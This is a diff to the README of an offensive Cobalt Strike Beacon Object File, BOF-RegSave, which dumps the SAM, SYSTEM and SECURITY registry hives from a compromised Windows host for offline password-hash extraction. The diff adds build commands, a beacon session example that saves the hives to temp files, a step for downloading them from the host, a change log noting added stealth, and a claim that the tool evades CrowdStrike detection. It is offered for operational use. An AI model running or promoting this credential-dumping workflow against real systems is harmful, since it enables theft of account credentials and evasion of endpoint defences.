@@ -1,28 +1,50 @@
 # About
 Beacon Object File(BOF) for CobaltStrike that will acquire the necessary privileges and dump SAM - SYSTEM - SECURITY registry keys for offline parsing and hash extraction.
 
+It will write 3 'temporary files' containing the SYSTEM, SAM and SECURITY hives to the standard temporary directory. They can then be downloaded and deleted from the host system.
+
+## Compiling
+
+Compiled BOFs provided for ease, but otherwise just run `make` in the root directory.
+
+```
+[stuart@ubuntu ~/dev/github.stufus/BOF-RegSave]$ make
+x86_64-w64-mingw32-gcc -o source/entry_x64.o -c source/entry.c -Os -s -Qn -nostdlib  -Wl,-s,--exclude-all-symbols
+x86_64-w64-mingw32-strip -N entry.c source/entry_x64.o
+i686-w64-mingw32-gcc -o source/entry_x86.o -c source/entry.c -Os -s -Qn -nostdlib  -Wl,-s,--exclude-all-symbols
+i686-w64-mingw32-strip -N entry.c source/entry_x86.o
+x86_64-w64-mingw32-ld -x -r source/*_x64.o -o regdump.x64.o
+i686-w64-mingw32-ld -x -r source/*_x86.o -o regdump.x86.o
+```
+
 ## Instructions
 
-CNA will register the command `bof-regsave`:
+Install the CNA script and run the `bof-regsave` command.
+
+## Example
 
 ```
-beacon> bof-regsave c:\temp\
+beacon> bof-regsave
+[+] host called home, sent: 2336 bytes
+[+] received output:
+regsave: SYSTEM hive saved to C:\Users\IT07C5~1.USE\AppData\Local\Temp\tmp4815.tmp
+regsave: SAM hive saved to C:\Users\IT07C5~1.USE\AppData\Local\Temp\tmp4813.tmp
+regsave: SECURITY hive saved to C:\Users\IT07C5~1.USE\AppData\Local\Temp\tmp4814.tmp
 ```
 
-By default the output will be saved in the following files:
+Those files can then be downloaded using the `download` command.
 
-```
-samantha.txt - SAM
-systemic.txt - SYSTEM
-security.txt - SECURITY
-```
+## Detection
 
-You can modify the file names by changing `entry.c`.
+At the time of writing (15/July/2022), this is not detected by Crowdstrike in aggressive mode.
 
 ## Credits
 
 Template & Makefile based on repo from [@realoriginal](https://github.com/realoriginal/beacon-object-file)
 
+## Change Log
+[@ukstufus] Automatically obtain and create temporary files for ease of use (and a little stealth), using beacon output
+formatting for tidier output, minor debugging changes.
 
 ## Reading material for BOF
 
